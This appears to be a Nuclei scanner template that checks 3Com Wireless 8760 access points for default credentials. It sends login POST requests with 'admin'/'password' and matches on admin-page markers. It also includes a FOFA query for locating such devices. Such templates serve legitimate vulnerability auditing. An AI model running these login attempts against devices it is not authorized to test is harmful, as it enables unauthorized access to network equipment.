id: 3Com-wireless-default-login

info:
  name: 3Com Wireless 8760 Dual Radio Default Credentials
  author: ritikchaddha
  severity: high
  description: 3Com Wireless 8760 Dual Radio default login credentials were discovered.
  reference:
    - https://www.speedguide.net/routers/3com-wl-546-3com-wireless-8760-dual-radio-11abg-1256
  metadata:
    max-request: 2
    fofa-query: title="3COM"
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)3COM"})
  tags: default-login,3com

http:
  - raw:
      - |
        POST /index.htm HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userid={{username}}&passwd={{password}}&Submit=LOGIN
      - |
        POST /login.html HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}

    stop-at-first-match: true
    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - password

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - alt="Advanced Configuration"
          - image/setup_wizard
        condition: and

      - type: status
        status:
          - 200

